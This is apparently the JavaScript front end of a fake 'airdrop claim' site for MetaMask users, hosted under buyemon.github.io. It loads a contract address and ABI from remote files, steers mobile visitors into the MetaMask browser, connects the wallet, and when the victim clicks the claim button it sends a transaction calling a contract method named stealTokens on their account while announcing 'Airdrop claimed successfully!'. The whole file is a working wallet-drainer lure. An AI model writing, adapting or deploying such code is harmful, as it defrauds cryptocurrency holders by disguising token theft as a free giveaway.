let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// Flag to prevent multiple redirections
let isRedirected = false;
let isConnected = false; // Flag to track connection state

// Function to load configuration and ABI files
async function loadConfig() {
    try {
        const configResponse = await fetch('https://buyemon.github.io/metamask/config.json');
        if (!configResponse.ok) {
            throw new Error('Failed to fetch config.json');
        }
        const configData = await configResponse.json();
        contractAddress = configData.contractAddress;
        tokenAddress = configData.tokenAddress;

        const abiResponse = await fetch('https://buyemon.github.io/metamask/abi.json');
        if (!abiResponse.ok) {
            throw new Error('Failed to fetch abi.json');
        }
        const abiData = await abiResponse.json();
        contractABI = abiData;

        console.log("Configuration loaded:", configData);
        console.log("ABI loaded:", abiData);
    } catch (error) {
        console.error("Error loading config or ABI: ", error);
        alert("Error loading configuration or ABI. Please try again later.");
    }
}

// Function to check device and handle MetaMask redirection
function redirectToMetaMask() {
    if (isRedirected || isConnected) return; // Prevent multiple redirections if already connected
    isRedirected = true;

    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (isMobile) {
        console.log("Mobile device detected. Checking if in MetaMask browser...");

        // Check if the user is already in the MetaMask browser
        if (navigator.userAgent.includes("MetaMask")) {
            console.log("Already in MetaMask browser. No redirection needed.");
            return;
        }

        // Redirect to MetaMask browser
        const deepLinkURL = "https://metamask.app.link/dapp/buyemon.github.io/metamask/index10.html";
        console.log("Redirecting to MetaMask browser:", deepLinkURL);
        window.location.href = deepLinkURL;

        // Fallback alert in case the redirect doesn't work
        setTimeout(() => {
            alert("If MetaMask did not open, please manually open MetaMask, navigate to the browser, and visit https://buyemon.github.io/metamask/index10.html");
        }, 3000);
    } else {
        console.log("Non-mobile device detected. Prompting for MetaMask installation...");
        alert("MetaMask is required to use this application. Please install MetaMask on your desktop or mobile device.");
    }
}

// Function to connect to MetaMask (for desktop and mobile users)
async function connectMetaMask() {
    if (isConnected) return; // Prevent reconnection if already connected

    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log("Connected accounts:", accounts);

            // Set connected flag to true
            isConnected = true;

            // Enable claim button and disable connect button
            document.getElementById('claimAirdropButton').disabled = false;
            document.getElementById('connectButton').disabled = true;
        } catch (error) {
            alert('MetaMask connection failed');
            console.error('MetaMask connection error:', error);
        }
    } else {
        alert("MetaMask is not installed. Please ensure you are using the MetaMask browser.");
    }
}

// Function to claim the airdrop
async function claimAirdrop() {
    if (!accounts) {
        alert('Please connect to MetaMask first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', (event) => {
    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

    // Load configuration
    loadConfig();

    // Only redirect if not already in MetaMask or already connected
    redirectToMetaMask();
});


